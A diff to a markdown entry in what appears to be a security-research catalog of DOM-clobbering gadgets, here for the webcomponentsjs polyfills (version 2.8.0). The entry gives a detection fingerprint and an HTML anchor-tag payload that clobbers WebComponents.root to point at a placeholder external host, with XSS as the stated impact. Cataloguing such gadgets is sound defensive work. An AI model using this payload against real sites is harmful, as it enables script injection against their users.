@@ -1,15 +1,16 @@
-## pagefind
+## polyfills
 
 ### Meta
 
-+ Library: polyfills/webcomponentsjs
++ Library: polyfills
 + Stars: 1.1K
-+ Version: 2.8.0
++ Version: v2.8.0
 + Fingerprint: `window.WebComponents !== 'undefined'`
 + Payload: ```<a id="ShadyDOM"></a><a id="ShadyDOM" name="force"></a><a id="WebComponents"></a><a id="WebComponents" name="root" href="https://xxx.xxx.xxx"></a>```
 + Impact: XSS
 + CVE: N/A
 + Foundby: TheHulk
++ TheThing: Flow
 
 ### Library
 
